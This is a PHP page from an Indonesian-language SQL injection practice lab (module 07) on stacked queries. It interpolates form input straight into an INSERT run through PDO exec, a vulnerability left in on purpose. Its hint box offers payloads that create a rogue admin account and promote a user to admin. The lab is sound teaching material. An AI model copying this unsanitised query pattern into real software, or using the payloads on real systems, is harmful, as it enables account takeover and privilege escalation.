<?php
/**
 * =============================================================
 * LAB 07 — Injeksi Stacked Queries (Multi-Statement)
 * KERENTANAN: Eksekusi multi-perintah SQL dengan pemisah titik-koma (;)
 * =============================================================
 */
require_once '../../db.php';

$search_query = '';
$results = [];
$executed_query = '';
$msg = '';
$msg_type = 'info';
$flagFeedback = null;

$db = getDB();

// Penanganan pengiriman flag atau konfirmasi manual
if (isset($_POST['action_progress'])) {
    if ($_POST['action_progress'] === 'submit_flag') {
        $flagFeedback = submitLabFlag('07', $_POST['flag_input'] ?? '');
    } elseif ($_POST['action_progress'] === 'toggle_manual') {
        $flagFeedback = toggleManualLab('07');
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['action_progress'])) {
    $search_query = $_POST['search'] ?? '';

    $raw_sql = "INSERT INTO search_log (query) VALUES ('$search_query');";
    $executed_query = $raw_sql;

    try {
        $db->exec($raw_sql);
        $msg = "Query berhasil dieksekusi oleh basis data!";
        $msg_type = "success";
    } catch (PDOException $e) {
        $msg = "Terjadi Error SQL: " . $e->getMessage();
        $msg_type = "error";
    }
}

$users_list = $db->query("SELECT id, username, role, secret FROM users")->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 07 — Stacked Queries | Lab SQLi</title>
    <link rel="stylesheet" href="../../assets/css/style.css">
</head>
<body>
<canvas id="matrix-canvas"></canvas>

<div class="lab-page wrapper">
    <a href="../../index.php" class="nav-back">← KEMBALI KE DASHBOARD</a>

    <div class="lab-header">
        <div class="lab-header-info">
            <div style="color:var(--text-dim); font-size:0.78rem; font-family:'JetBrains Mono',monospace; letter-spacing:2px; margin-bottom:8px;">MODUL 07 / 08</div>
            <h1 style="font-size:1.85rem; margin-bottom:8px;">📚 Stacked Queries (Multi-Statement)</h1>
            <div class="meta" style="display:flex; align-items:center; gap:10px;">
                <span class="badge badge-expert">Tingkat Ahli</span>
                <span class="vuln-label">⚠ RENTAN</span>
                <span style="color:var(--text-dim); font-size:0.82rem;">Teknik: Penumpukan Perintah Titik-Koma (INSERT / UPDATE)</span>
                <?php if (isLabCompleted('07')): ?>
                    <span class="badge" style="background:rgba(16,185,129,0.15); color:#34d399; border:1px solid #10b981;">✓ Selesai</span>
                <?php endif; ?>
            </div>
        </div>
    </div>

    <?php if ($flagFeedback): ?>
    <div style="padding:14px 18px; border-radius:10px; margin-bottom:20px; font-weight:600; font-size:0.9rem;
                background: <?= $flagFeedback['success'] ? 'rgba(16,185,129,0.1)' : 'rgba(244,63,94,0.1)' ?>;
                border: 1px solid <?= $flagFeedback['success'] ? '#10b981' : '#f43f5e' ?>;
                color: <?= $flagFeedback['success'] ? '#34d399' : '#fb7185' ?>;">
        <?= htmlspecialchars($flagFeedback['message']) ?>
    </div>
    <?php endif; ?>

    <div class="panel">
        <div class="panel-header">
            <div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div>
            <div class="panel-title">DESKRIPSI KERENTANAN</div>
        </div>
        <p style="font-size:0.9rem; color:var(--text-muted); line-height:1.6; margin-bottom:14px;">
            Stacked Queries memungkinkan penyerang menyisipkan perintah SQL baru dengan menggunakan pemisah titik-koma (<code>;</code>). Anda dapat menyisipkan akun admin baru dengan flag tersendiri.
        </p>
    </div>

    <!-- Kotak Submit Flag / Progres Modul 07 -->
    <?php renderFlagSubmissionBox('07'); ?>

    <?php if ($msg): ?>
    <div style="padding:12px 20px; border-radius:8px; margin-bottom:20px; font-size:0.88rem; font-weight:600;
                background: <?= $msg_type === 'success' ? 'rgba(16,185,129,0.08)' : 'rgba(244,63,94,0.08)' ?>;
                border: 1px solid <?= $msg_type === 'success' ? '#10b981' : '#f43f5e' ?>;
                color: <?= $msg_type === 'success' ? '#34d399' : '#fb7185' ?>;">
        <?= htmlspecialchars($msg) ?>
    </div>
    <?php endif; ?>

    <div class="grid-2">
        <div>
            <div class="panel">
                <div class="panel-header">
                    <div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div>
                    <div class="panel-title">TARGET: FORM PENCATAT LOG PENCARIAN</div>
                </div>
                <form method="POST">
                    <div class="form-group">
                        <label>Input Kata Kunci Pencarian</label>
                        <input type="text" name="search" id="search" placeholder="Ketik kata kunci atau susun perintah SQL bertumpuk..." value="<?= htmlspecialchars($search_query) ?>" required>
                    </div>
                    <button type="submit" class="btn btn-primary btn-full">
                        ⚡ &nbsp; EKSEKUSI PERINTAH SQL BERTUMPUK
                    </button>
                </form>
            </div>

            <div class="hint-box">
                <button class="hint-toggle" onclick="toggleHint('hint7')">
                    💡 CONTOH PAYLOAD STACKED QUERIES <span class="arrow">▼</span>
                </button>
                <div class="hint-content" id="hint7">
                    <p><strong style="color:#fbbf24;">Klik payload untuk membuat akun admin pembawa flag:</strong></p>
                    <ul class="payload-list">
                        <li data-target="search" data-payload="hacker'); INSERT INTO users (username, password, email, role, secret) VALUES ('evil_root', 'pass', 'root@pwned.lab', 'admin', 'FLAG{stacked_insert_win}'); --">Sisipkan akun admin baru dengan flag: FLAG{stacked_insert_win}</li>
                        <li data-target="search" data-payload="hacker'); UPDATE users SET role='admin' WHERE username='alice'; --">Ubah 'alice' menjadi admin</li>
                    </ul>
                </div>
            </div>
        </div>

        <div>
            <div class="panel">
                <div class="panel-header">
                    <div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div>
                    <div class="panel-title">MONITOR QUERY SQL REAL-TIME</div>
                </div>
                <div class="code-block" style="color:#06b6d4; word-break:break-all;">
<?= $executed_query ? htmlspecialchars($executed_query) : '-- Menunggu input query...' ?>
                </div>
            </div>

            <div class="panel" style="border-color:rgba(6,182,212,0.3);">
                <div class="panel-header">
                    <div class="panel-title" style="color:#06b6d4;">📊 MONITOR REAL-TIME: ISI TABEL USERS</div>
                </div>
                <div style="overflow-x:auto;">
                <table class="data-table">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Username</th>
                            <th>Peran</th>
                            <th>Secret Flag</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($users_list as $u): ?>
                        <tr>
                            <td><?= htmlspecialchars($u['id']) ?></td>
                            <td style="color:#34d399; font-weight:600;"><?= htmlspecialchars($u['username']) ?></td>
                            <td>
                                <span style="color:<?= $u['role'] === 'admin' ? '#f43f5e' : '#fbbf24' ?>; font-weight:600;">
                                    <?= htmlspecialchars($u['role']) ?>
                                </span>
                            </td>
                            <td class="flag" style="cursor:pointer;" title="Klik untuk salin" onclick="copyText('<?= htmlspecialchars($u['secret']) ?>')">
                                <?= htmlspecialchars($u['secret']) ?> 📋
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
                </div>
            </div>
        </div>
    </div>
</div>

<footer class="site-footer">MODUL 07 — STACKED QUERIES · LAB PRAKTIK SQL INJECTION</footer>
<script src="../../assets/js/main.js"></script>
</body>
</html>
